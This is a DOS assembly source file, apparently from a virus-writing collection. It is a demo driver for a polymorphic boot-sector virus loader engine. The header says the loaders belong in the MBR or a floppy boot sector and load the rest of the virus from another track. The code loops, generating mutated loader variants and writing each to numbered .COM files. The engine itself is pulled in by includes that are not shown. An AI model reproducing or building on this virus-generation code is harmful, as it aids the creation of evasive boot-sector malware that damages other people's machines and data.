; - -[DEMO.ASM] - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
;
; This demo program generates 99999999 little demos of my engine. This code
; must reside in the MBR or the  boot sector of a floppy or harddrive. They
; will load the rest of the virus from other track. They're very  variable.
; This code is designed to run in a boot, so, if you execute the demos they
; will surely crash. Check the code with a debugger.


.model tiny
.code
.startup
.386

       push cs
       pop ds
       push cs
       pop es
do_next:
       call random_init
       mov di, 08000h
       mov cx, 1
       mov dx, 0180h
       call makeloader
       mov ah, 3ch
       mov dx, offset fn2
       xor cx, cx
       int 21h
       jc exit_dem
       xchg ax, bx
       mov ah, 40h
       mov cx, word ptr [STOP]
       mov dx, word ptr [START]
       sub cx, dx
       int 21h
       mov ah, 3eh
       int 21h
       cmp byte ptr ds:[fn2+7], '9'
       je zero_1
       inc byte ptr ds:[fn2+7]
       jmp next_file
zero_1:
       mov byte ptr ds:[fn2+7], '0'
       cmp byte ptr ds:[fn2+6], '9'
       je zero_2
       inc byte ptr ds:[fn2+6]
       jmp next_file
zero_2:
       mov byte ptr ds:[fn2+6], '0'
       cmp byte ptr ds:[fn2+5], '9'
       je zero_3
       inc byte ptr ds:[fn2+5]
       jmp next_file
zero_3:
       mov byte ptr ds:[fn2+5], '0'
       cmp byte ptr ds:[fn2+4], '9'
       je zero_4
       inc byte ptr ds:[fn2+4]
       jmp next_file
zero_4:
       mov byte ptr ds:[fn2+4], '0'
       cmp byte ptr ds:[fn2+3], '9'
       je zero_5
       inc byte ptr ds:[fn2+3]
       jmp next_file
zero_5:
       mov byte ptr ds:[fn2+3], '0'
       cmp byte ptr ds:[fn2+2], '9'
       je zero_6
       inc byte ptr ds:[fn2+2]
       jmp next_file
zero_6:
       mov byte ptr ds:[fn2+2], '0'
       cmp byte ptr ds:[fn2+1], '9'
       je zero_7
       inc byte ptr ds:[fn2+1]
       jmp next_file
zero_7:
       mov byte ptr ds:[fn2+1], '0'
       cmp byte ptr ds:[fn2], '9'
       je exit_dem
       inc byte ptr ds:[fn2]
       jmp next_file
next_file:
       jmp do_next
exit_dem:
       int 20h

fn2    db '00000000.COM',0

seg_need db 65h

        include random.asm
        org 01000h
        include vrbl.asm
end